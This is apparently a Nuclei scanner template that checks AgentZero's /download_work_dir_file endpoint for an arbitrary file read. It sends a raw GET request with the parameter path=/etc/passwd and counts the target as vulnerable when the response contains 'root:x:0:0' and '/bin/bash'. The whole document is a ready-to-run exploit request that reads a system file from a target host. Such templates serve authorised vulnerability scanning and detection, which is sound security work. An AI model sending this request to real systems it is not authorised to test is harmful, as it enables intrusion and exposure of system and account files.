id: AgentZero-download_work_dir_file-readfile
info:
  name: AgentZero-download_work_dir_file-readfile
  author: lemonlove7
  severity: high
http:
  - raw:
      - |-
        GET /download_work_dir_file?path=/etc/passwd HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Priority: u=4
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0
        Accept-Encoding: gzip, deflate
        Content-Type: application/json
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Content-Length: 91
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - root:x:0:0
          - /bin/bash
    matchers-condition: and
